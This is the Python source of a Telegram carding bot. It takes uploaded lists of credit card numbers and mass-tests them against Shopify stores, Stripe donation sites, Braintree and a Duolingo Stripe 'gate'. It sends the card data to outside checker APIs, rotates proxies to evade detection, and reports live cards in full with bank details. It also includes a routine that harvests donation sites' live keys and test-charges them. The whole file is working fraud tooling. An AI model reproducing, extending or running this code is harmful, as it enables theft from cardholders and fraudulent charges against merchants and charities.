import os
import json
import re
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
from telebot import types

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# Permission system for approved users (non-owners)
# ============================================================================
APPROVED_USERS_FILE = "approved_users.json"
USER_PROXIES_FILE = "user_proxies.json"

def load_approved_users():
    if os.path.exists(APPROVED_USERS_FILE):
        with open(APPROVED_USERS_FILE, 'r') as f:
            return set(json.load(f))
    return set()

def save_approved_users(approved_set):
    with open(APPROVED_USERS_FILE, 'w') as f:
        json.dump(list(approved_set), f)

def load_user_proxies():
    if os.path.exists(USER_PROXIES_FILE):
        with open(USER_PROXIES_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_user_proxies(proxies_dict):
    with open(USER_PROXIES_FILE, 'w') as f:
        json.dump(proxies_dict, f, indent=2)

# Global sets/dicts
approved_users = load_approved_users()
user_proxies_store = load_user_proxies()   # key: user_id (str), value: list of proxy strings

def is_user_allowed(user_id):
    """Check if user is owner or in approved list."""
    return user_id in OWNER_ID or user_id in approved_users

# ============================================================================
def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                          check_site_func, is_valid_response_func,
                          process_response_func, update_stats_func, save_json_func,
                          is_user_allowed_func):   # we will override this function internally
    # Override the passed is_user_allowed_func with our own that includes approved users
    def user_allowed(uid):
        return is_user_allowed(uid)

    # ------------------------------------------------------------------------
    # Commands to manage approved users (owners only)
    # ------------------------------------------------------------------------
    @bot.message_handler(commands=['adduser'])
    def cmd_adduser(message):
        if message.from_user.id not in OWNER_ID:
            bot.reply_to(message, "🚫 Owner only.")
            return
        try:
            uid = int(message.text.split()[1])
            approved_users.add(uid)
            save_approved_users(approved_users)
            bot.reply_to(message, f"✅ User {uid} added to approved list.")
        except (IndexError, ValueError):
            bot.reply_to(message, "Usage: /adduser <user_id>")

    @bot.message_handler(commands=['removeuser'])
    def cmd_removeuser(message):
        if message.from_user.id not in OWNER_ID:
            bot.reply_to(message, "🚫 Owner only.")
            return
        try:
            uid = int(message.text.split()[1])
            approved_users.discard(uid)
            save_approved_users(approved_users)
            bot.reply_to(message, f"✅ User {uid} removed from approved list.")
        except (IndexError, ValueError):
            bot.reply_to(message, "Usage: /removeuser <user_id>")

    # ------------------------------------------------------------------------
    # Commands for user proxy management
    # ------------------------------------------------------------------------
    @bot.message_handler(commands=['addproxy'])
    def cmd_addproxy(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Usage: /addproxy ip:port OR ip:port:user:pass")
            return
        proxy = args[1].strip()
        # Basic format validation
        parts = proxy.split(':')
        if len(parts) not in (2, 4):
            bot.reply_to(message, "❌ Invalid format. Use ip:port or ip:port:user:pass")
            return
        uid = str(message.from_user.id)
        if uid not in user_proxies_store:
            user_proxies_store[uid] = []
        if proxy not in user_proxies_store[uid]:
            user_proxies_store[uid].append(proxy)
            save_user_proxies(user_proxies_store)
            bot.reply_to(message, f"✅ Proxy added. Total: {len(user_proxies_store[uid])}")
        else:
            bot.reply_to(message, "⚠️ Proxy already in your list.")

    @bot.message_handler(commands=['myproxies'])
    def cmd_myproxies(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        uid = str(message.from_user.id)
        proxies = user_proxies_store.get(uid, [])
        if not proxies:
            bot.reply_to(message, "📭 You have no saved proxies.")
            return
        proxy_list = "\n".join([f"{i+1}. {p}" for i, p in enumerate(proxies)])
        bot.reply_to(message, f"🔌 Your proxies:\n{proxy_list}")

    @bot.message_handler(commands=['clearproxies'])
    def cmd_clearproxies(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        uid = str(message.from_user.id)
        if uid in user_proxies_store and user_proxies_store[uid]:
            user_proxies_store[uid] = []
            save_user_proxies(user_proxies_store)
            bot.reply_to(message, "✅ All your proxies cleared.")
        else:
            bot.reply_to(message, "📭 You have no proxies to clear.")

    # ==========================================================================
    # FILE UPLOAD HANDLER (with permission fix and proxy saving)
    # ==========================================================================
    @bot.message_handler(content_types=['document'])
    def handle_file_upload_event(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 <b>Access Denied:</b> Contact Admin.", parse_mode='HTML')
            return

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                bot.reply_to(message, "❌ <b>Format Error:</b> Only .txt files.", parse_mode='HTML')
                return

            msg_loading = bot.reply_to(message, "⏳ <b>Reading File...</b>", parse_mode='HTML')

            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            ccs = extract_cards_from_text(file_content)

            if ccs:
                user_id = message.from_user.id
                if user_id not in user_sessions:
                    user_sessions[user_id] = {}
                user_sessions[user_id]['ccs'] = ccs
                user_sessions[user_id]['proxies'] = []   # temporary proxies from file (not saved)

                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(
                    types.InlineKeyboardButton("🛍️ Shopify Mass (Multi-Site)", callback_data="run_mass_shopify"),
                    types.InlineKeyboardButton("💳 Stripe Donation (Multi)", callback_data="run_mass_stripe_donation"),
                    types.InlineKeyboardButton("💰 Braintree Auth (bandc)", callback_data="run_mass_braintree_mass"),
                    types.InlineKeyboardButton("🔤 Duolingo Stripe Auth", callback_data="run_mass_duolingo_stripe"),
                    types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
                )

                bot.edit_message_text(
                    f"📂 <b>File:</b> <code>{file_name}</code>\n"
                    f"💳 <b>Cards:</b> {len(ccs)}\n"
                    f"<b>⚡ Select Checking Gate:</b>",
                    message.chat.id, msg_loading.message_id, reply_markup=markup, parse_mode='HTML'
                )
            else:
                # Try to load proxies from file
                proxies = [line.strip() for line in file_content.split('\n') if ':' in line]
                if proxies:
                    user_id = message.from_user.id
                    uid = str(user_id)
                    # Save to persistent storage
                    if uid not in user_proxies_store:
                        user_proxies_store[uid] = []
                    # Add new proxies (avoid duplicates)
                    added = 0
                    for p in proxies:
                        if p not in user_proxies_store[uid]:
                            user_proxies_store[uid].append(p)
                            added += 1
                    if added > 0:
                        save_user_proxies(user_proxies_store)
                    # Also store in session for immediate use
                    if user_id not in user_sessions:
                        user_sessions[user_id] = {}
                    user_sessions[user_id]['proxies'] = user_proxies_store[uid]   # load all saved
                    bot.edit_message_text(
                        f"🔌 <b>Proxies Loaded:</b> {added} new (total {len(user_proxies_store[uid])})\n✅ You can now run Mass Check.",
                        message.chat.id, msg_loading.message_id, parse_mode='HTML'
                    )
                else:
                    bot.edit_message_text("❌ No valid CCs or Proxies found.", message.chat.id, msg_loading.message_id)

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    # ==========================================================================
    # MASS CHECK COMMAND (uses persistent proxies if available)
    # ==========================================================================
    @bot.message_handler(commands=['msh', 'hardcook'])
    def handle_mass_check_command(message):
        if not user_allowed(message.from_user.id):
            bot.send_message(message.chat.id, "🚫 <b>Access Denied</b>", parse_mode='HTML')
            return

        user_id = message.from_user.id
        if user_id not in user_sessions or 'ccs' not in user_sessions[user_id] or not user_sessions[user_id]['ccs']:
            bot.send_message(message.chat.id, "⚠️ <b>Upload CCs first!</b>", parse_mode='HTML')
            return

        ccs = user_sessions[user_id]['ccs']
        sites = get_filtered_sites_func()

        if not sites:
            bot.send_message(message.chat.id, "❌ <b>No sites available!</b> Add sites via /addurls", parse_mode='HTML')
            return

        # Get proxies (from session or persistent)
        active_proxies = get_active_proxies_for_user(user_id, bot, message)
        if active_proxies is None:
            return   # error message already sent

        source = f"🔌 Proxies: {len(active_proxies)}"
        start_msg = bot.send_message(message.chat.id, f"🔥 <b>Starting...</b>\n💳 {len(ccs)} Cards\n{source}", parse_mode='HTML')

        threading.Thread(
            target=process_mass_check_engine,
            args=(bot, message, start_msg, ccs, sites, active_proxies,
                  check_site_shopify_direct, process_response_func, update_stats_func, 'both')
        ).start()

    # ==========================================================================
    # Helper: get and validate proxies for user
    # ==========================================================================
    def get_active_proxies_for_user(user_id, bot, message):
        """Return list of live proxies for user, or None if none available (and send error)."""
        # First check session proxies (uploaded via file)
        if user_id in user_sessions and user_sessions[user_id].get('proxies'):
            proxy_list = user_sessions[user_id]['proxies']
        else:
            # Fallback to persistent storage
            uid = str(user_id)
            proxy_list = user_proxies_store.get(uid, [])
            if not proxy_list and user_id in OWNER_ID:
                # Owner can use server proxies
                proxy_list = proxies_data.get('proxies', [])

        if not proxy_list:
            bot.send_message(message.chat.id,
                             "🚫 <b>No Proxies Available!</b>\n"
                             "Add proxies via:\n"
                             "• Upload a .txt file\n"
                             "• /addproxy ip:port:user:pass",
                             parse_mode='HTML')
            return None

        # Validate proxies
        live_proxies = validate_proxies_strict(proxy_list, bot, message)
        if not live_proxies:
            bot.send_message(message.chat.id, "❌ <b>All Proxies Dead.</b> Please add more.", parse_mode='HTML')
            return None
        return live_proxies

    # ==========================================================================
    # Improved hit message sender (full CC, no masking)
    # ==========================================================================
    def send_hit_improved(bot, chat_id, res, title):
        try:
            cc = res['cc']  # full card number
            bin_info = get_bin_info(cc)
            site_domain = res['site_url'].replace('https://', '').replace('http://', '').split('/')[0]

            bank_line = f"{bin_info.get('country_flag', '')} {bin_info.get('bank', 'UNKNOWN')}"
            card_line = f"{bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}"

            msg = (
                f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃   {title} HIT!\n"
                f"┗━━━━━━━━━━━━━━━━━━━━┛\n"
                f"💳 <b>Card:</b> <code>{cc}</code>\n"
                f"📟 <b>Resp:</b> {res['response']}\n"
                f"💰 <b>Amt:</b> ${res['price']}\n"
                f"🌐 <b>Site:</b> {site_domain}\n"
                f"🔌 <b>Gate:</b> {res['gateway']}\n"
                f"🏦 <b>Bank:</b> {bank_line}\n"
                f"💳 <b>Type:</b> {card_line}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
            )
            bot.send_message(chat_id, msg, parse_mode='HTML')
        except Exception as e:
            # Fallback
            bot.send_message(chat_id, f"{title}\n{res['cc']}\n{res['response']}")

    # ==========================================================================
    # Mass check engine with filter support
    # ==========================================================================
    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies,
                                  check_site_func, process_response_func, update_stats_func,
                                  hit_filter='both'):
        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
        total = len(ccs)
        processed = 0
        start_time = time.time()
        last_update_time = time.time()

        def worker(cc):
            attempts = 0
            while attempts < MAX_RETRIES:
                try:
                    site = random.choice(sites)
                    proxy = random.choice(proxies)
                    api_response = check_site_func(site['url'], cc, proxy)

                    if not api_response:
                        attempts += 1
                        continue

                    resp_text, status, gateway = process_response_func(api_response, site.get('price', '0'))

                    if any(x in resp_text.upper() for x in ["PROXY", "TIMEOUT", "CAPTCHA"]):
                        attempts += 1
                        continue

                    return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway,
                            'price': site.get('price', '0'), 'site_url': site['url']}
                except:
                    attempts += 1
            return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown',
                    'price': '0', 'site_url': 'N/A'}

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(worker, cc): cc for cc in ccs}
            for future in as_completed(futures):
                processed += 1
                res = future.result()

                if res['status'] == 'APPROVED':
                    if any(x in res['response'].upper() for x in ["THANK", "CONFIRMED", "SUCCESS"]):
                        res['final_status'] = 'COOKED'
                        results['cooked'].append(res)
                        update_stats_func('COOKED', True)
                        if hit_filter in ['cooked', 'both']:
                            send_hit_improved(bot, message.chat.id, res, "🔥 COOKED")
                    else:
                        res['final_status'] = 'APPROVED'
                        results['approved'].append(res)
                        update_stats_func('APPROVED', True)
                        if hit_filter in ['approved', 'both']:
                            send_hit_improved(bot, message.chat.id, res, "✅ APPROVED")
                elif res['status'] == 'APPROVED_OTP':
                    res['final_status'] = 'APPROVED_OTP'
                    results['approved'].append(res)
                    update_stats_func('APPROVED_OTP', True)
                    if hit_filter in ['approved', 'both']:
                        send_hit_improved(bot, message.chat.id, res, "⚠️ APPROVED (OTP)")
                elif res['status'] == 'DECLINED':
                    results['declined'].append(res)
                    update_stats_func('DECLINED', True)
                else:
                    results['error'].append(res)

                if time.time() - last_update_time > 3 or processed == total:
                    update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
                    last_update_time = time.time()

        # Save error cards
        error_list = [f"{res['cc']} : {res['response']}" for res in results['error']]
        if error_list:
            error_file = f"error_cards_{message.from_user.id}.txt"
            with open(error_file, 'w') as f:
                f.write("\n".join(error_list))
            with open(error_file, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"⚠️ Error cards ({len(error_list)})")
            os.remove(error_file)

        duration = time.time() - start_time
        send_final(bot, message.chat.id, status_msg.message_id, total, results, duration)

    # ==========================================================================
    # Filter selection for Shopify
    # ==========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
    def callback_shopify_filter(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            # Get and validate proxies
            proxies = get_active_proxies_for_user(user_id, bot, call.message)
            if proxies is None:
                return

            user_sessions[user_id]['temp_proxies'] = proxies

            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🔥 Cooked Only", callback_data="shopify_filter_cooked"),
                types.InlineKeyboardButton("✅ Approved Only", callback_data="shopify_filter_approved"),
                types.InlineKeyboardButton("Both", callback_data="shopify_filter_both")
            )
            bot.send_message(
                call.message.chat.id,
                "🔍 <b>Select which hits to display:</b>",
                reply_markup=markup,
                parse_mode='HTML'
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data.startswith("shopify_filter_"))
    def callback_start_shopify_mass(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            filter_choice = call.data.replace("shopify_filter_", "")  # cooked / approved / both
            user_id = call.from_user.id

            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = user_sessions[user_id].get('temp_proxies')
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 Proxies missing. Please restart.")
                return

            del user_sessions[user_id]['temp_proxies']

            start_msg = bot.send_message(
                call.message.chat.id,
                f"🔥 <b>Shopify Mass Check Started...</b>\n"
                f"💳 Cards: {len(user_sessions[user_id]['ccs'])}\n"
                f"🔌 Proxies: {len(proxies)}\n"
                f"🎯 Filter: {filter_choice.upper()}",
                parse_mode='HTML'
            )

            process_mass_check_engine(
                bot, call.message, start_msg,
                user_sessions[user_id]['ccs'],
                get_filtered_sites_func(),
                proxies,
                check_site_shopify_direct,
                process_response_func,
                update_stats_func,
                hit_filter=filter_choice
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    # ==========================================================================
    # Other mass check callbacks (updated to use improved hit sender)
    # ==========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe_donation")
    def callback_stripe_donation(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies_for_user(user_id, bot, call.message)
            if proxies is None:
                return

            process_mass_gate_check(
                bot, call.message,
                user_sessions[user_id]['ccs'],
                gates.check_stripe_donation,
                "Stripe Donation (Multi)",
                proxies
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_braintree_mass")
    def callback_braintree_mass(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies_for_user(user_id, bot, call.message)
            if proxies is None:
                return

            process_mass_gate_check(
                bot, call.message,
                user_sessions[user_id]['ccs'],
                gates.check_braintree_mass,
                "Braintree Mass (bandc)",
                proxies
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_duolingo_stripe")
    def callback_duolingo_stripe(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies_for_user(user_id, bot, call.message)
            if proxies is None:
                return

            process_mass_gate_check(
                bot, call.message,
                user_sessions[user_id]['ccs'],
                gates.check_duolingo_stripe,
                "Duolingo Stripe Auth",
                proxies
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    # ==========================================================================
    # /stsite command (unchanged)
    # ==========================================================================
    @bot.message_handler(commands=['stsite'])
    def handle_stsite_command(message):
        if message.from_user.id not in OWNER_ID:
            bot.reply_to(message, "🚫 Owner only command.")
            return

        bot.reply_to(
            message,
            "📤 **Send a .txt file** containing Stripe donation sites.\n"
            "Each line can have extra text, as long as it contains a URL and a `pk_live_...` key.\n"
            "Example: `https://example.com/donate | pk_live_abc123`\n"
            "I will extract them automatically and test them with a card.",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(message, process_stsite_file)

    def process_stsite_file(message):
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Please send a **.txt** file.")
            return

        try:
            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            candidates = []
            lines = file_content.split('\n')
            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                match = re.search(r'(https?://[^\s|]+).*?(pk_live_[a-zA-Z0-9]+)', line, re.IGNORECASE)
                if match:
                    url = match.group(1).rstrip('/')
                    pk = match.group(2)
                    candidates.append({'url': url, 'pk': pk})

            if not candidates:
                bot.reply_to(message, "❌ No valid URL+PK pairs found in the file.")
                return

            if not hasattr(bot, 'pending_stsite'):
                bot.pending_stsite = {}
            bot.pending_stsite[message.from_user.id] = candidates

            bot.reply_to(
                message,
                f"✅ Extracted **{len(candidates)}** potential sites.\n"
                f"Now send me a **test card** (format: `CC|MM|YYYY|CVV`) to validate them.\n"
                f"Example: `5154620020023386|10|2027|840`",
                parse_mode='Markdown'
            )
            bot.register_next_step_handler(message, process_test_card)

        except Exception as e:
            bot.reply_to(message, f"❌ Error reading file: {str(e)}")

    def process_test_card(message):
        user_id = message.from_user.id
        if not hasattr(bot, 'pending_stsite') or user_id not in bot.pending_stsite:
            bot.reply_to(message, "❌ No pending sites. Please start over with /stsite.")
            return

        test_cc = message.text.strip()
        if not re.match(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', test_cc):
            bot.reply_to(message, "❌ Invalid card format. Use `CC|MM|YYYY|CVV`", parse_mode='Markdown')
            return

        candidates = bot.pending_stsite[user_id]
        total = len(candidates)
        working = []
        failed = []

        status_msg = bot.reply_to(message, f"🔄 Testing {total} sites with your card... This may take a while.", parse_mode='HTML')

        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None

        for idx, site in enumerate(candidates, 1):
            url = site['url']
            pk = site['pk']
            try:
                if idx % 5 == 0 or idx == total:
                    bot.edit_message_text(
                        f"🔄 Testing sites... {idx}/{total}\n"
                        f"✅ Working: {len(working)}\n"
                        f"❌ Failed: {len(failed)}",
                        message.chat.id, status_msg.message_id
                    )

                result = test_donation_site_like_script(url, pk, test_cc, proxy)
                if result == "Charge ✅":
                    working.append(site)
                else:
                    failed.append(f"{url} ({result})")
            except Exception as e:
                failed.append(f"{url} (error: {str(e)[:50]})")

        donation_file = "donation_sites.json"
        if os.path.exists(donation_file):
            with open(donation_file, 'r') as f:
                existing = json.load(f)
        else:
            existing = []

        added = 0
        for site in working:
            if not any(s['url'] == site['url'] for s in existing):
                existing.append({
                    'url': site['url'],
                    'pk': site['pk'],
                    'type': 'givewp'
                })
                added += 1

        with open(donation_file, 'w') as f:
            json.dump(existing, f, indent=2)

        del bot.pending_stsite[user_id]

        report = (
            f"✅ **Testing Complete**\n\n"
            f"📊 Total candidates: {total}\n"
            f"✅ Working: {len(working)}\n"
            f"❌ Failed: {len(failed)}\n"
            f"🆕 Added to database: {added}\n\n"
        )
        if failed:
            report += "**Failed sites (first 10):**\n" + "\n".join(failed[:10])
            if len(failed) > 10:
                report += f"\n... and {len(failed)-10} more"

        bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')

    # ==========================================================================
    # UI update helpers
    # ==========================================================================
    def update_ui(bot, chat_id, mid, processed, total, results):
        try:
            msg = f"""
┏━━━━━━━⍟
┃ <b>⚡ MASS CHECKING...</b>
┗━━━━━━━━━━━⊛
{create_progress_bar(processed, total)}
<b>Progress:</b> {processed}/{total}
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
⚠️ <b>Errors:</b> {len(results['error'])}
"""
            bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
        except:
            pass

    def send_final(bot, chat_id, mid, total, results, duration):
        msg = f"""
┏━━━━━━━⍟
┃ <b>✅ CHECK COMPLETED</b>
┗━━━━━━━━━━━⊛
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
<b>Total:</b> {total} | <b>Time:</b> {duration:.2f}s
"""
        try:
            bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
        except:
            bot.send_message(chat_id, msg, parse_mode='HTML')

    # ==========================================================================
    # Cancel callback
    # ==========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
    def callback_cancel(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, "❌ Operation cancelled.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    # Return the new permission function if needed elsewhere
    return user_allowed

# ============================================================================
# Shopify checker with fallback (improved)
# ============================================================================
def check_site_shopify_direct(site_url, cc, proxy=None):
    import urllib.parse
    import requests
    import re

    def call_api(api_base):
        try:
            clean_site = site_url.rstrip('/')
            proxy_str = proxy
            api_proxy = ""
            if proxy_str:
                proxy_str = proxy_str.strip()
                parts = proxy_str.split(':')
                if len(parts) == 4:
                    api_proxy = proxy_str
                elif '@' in proxy_str:
                    match = re.match(r'(?:http://)?([^:]+):([^@]+)@([^:]+):(\d+)', proxy_str)
                    if match:
                        user, password, host, port = match.groups()
                        api_proxy = f"{host}:{port}:{user}:{password}"
                elif len(parts) == 2:
                    api_proxy = proxy_str

            encoded_cc = urllib.parse.quote(cc)
            encoded_proxy = urllib.parse.quote(api_proxy) if api_proxy else ""

            if api_base == "mentoschk":
                url = f"http://mentoschk.com/shopify?site={clean_site}&cc={encoded_cc}"
                if encoded_proxy:
                    url += f"&proxy={encoded_proxy}"
            else:  # hqdumps
                api_key = "techshopify"
                url = f"https://hqdumps.com/autoshopify/index.php?key={api_key}&url={clean_site}&cc={encoded_cc}"
                if encoded_proxy:
                    url += f"&proxy={encoded_proxy}"

            session = requests.Session()
            session.verify = False
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response = session.get(url, headers=headers, timeout=90)

            if response.status_code != 200:
                print(f"[API] {api_base} returned {response.status_code}")
                return None

            data = response.json()
            print(f"[API] {api_base} raw response: {data}")

            if api_base == "mentoschk":
                return {
                    'Response': data.get('Response', 'Unknown'),
                    'Price': str(data.get('Price', '0.00')),
                    'Gateway': data.get('Gateway', 'Shopify API'),
                    'Status': data.get('Status', False)
                }
            else:
                resp_text = data.get('Response', 'Unknown')
                status = False if 'UNABLE' in resp_text.upper() or 'FAILED' in resp_text.upper() else True
                return {
                    'Response': resp_text,
                    'Price': str(data.get('Price', '0.00')),
                    'Gateway': data.get('Gate', 'Shopify API'),
                    'Status': status
                }
        except Exception as e:
            print(f"[API] {api_base} exception: {e}")
            return None

    # Try primary API
    result = call_api("mentoschk")

    # If primary failed (None) OR returned a non‑successful response, try secondary
    if result is None:
        result = call_api("hqdumps")
    else:
        # Determine if the response is already a clear success
        resp_text = result['Response'].upper()
        approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS']
        approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
        if not any(k in resp_text for k in approved_keywords + approved_otp_keywords):
            # Not a success – try secondary
            result2 = call_api("hqdumps")
            if result2 is not None:
                result = result2

    if result is None:
        return {
            'Response': 'Both APIs failed',
            'status': 'ERROR',
            'gateway': 'Shopify API',
            'price': '0.00',
            'message': 'No response from any API'
        }

    response_text = result['Response']
    price = result['Price']
    gateway = result['Gateway']
    status_bool = result['Status']
    response_upper = response_text.upper()

    # --- Enhanced mapping ---
    approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS', 'INSUFFICIENT_FUNDS']
    approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
    declined_keywords = ['CARD DECLINED', 'DECLINED', 'EXPIRED_CARD', 'EXPIRED', 'FRAUD', 'SUSPECTED',
                         'INCORRECT CVC', 'INCORRECT_CVC', 'INCORRECT ZIP', 'INCORRECT_ZIP',
                         'INCORRECT NUMBER', 'INCORRECT_NUMBER', 'INVALID NUMBER', 'DO NOT HONOR',
                         'PICKUP', 'LOST CARD', 'STOLEN CARD', 'AMOUNT TOO SMALL', 'AMOUNT_TOO_SMALL']
    extra_declined = ['SUBMIT REJECTED', 'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT',
                      'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE',
                      'PAYMENTS_CREDIT_CARD_SESSION_ID']
    error_keywords = ['FAILED TO TOKENIZE CARD', 'SITE DEAD', 'GENERIC_ERROR', 'DEAD/TIMEOUT',
                      'TIMEOUT', 'PROXY', 'UNABLE TO GET PAYMENT TOKEN', 'CART ADD FAILED',
                      'SUBMIT FAILED', 'RECHECK']

    if any(k in response_upper for k in approved_keywords):
        status = 'APPROVED'
    elif any(k in response_upper for k in approved_otp_keywords):
        status = 'APPROVED_OTP'
    elif any(k in response_upper for k in declined_keywords + extra_declined):
        status = 'DECLINED'
    elif any(k in response_upper for k in error_keywords):
        status = 'ERROR'
    else:
        status = 'ERROR' if status_bool is False else 'DECLINED'

    return {
        'Response': response_text,
        'status': status,
        'gateway': gateway,
        'price': price,
        'message': response_text
    }
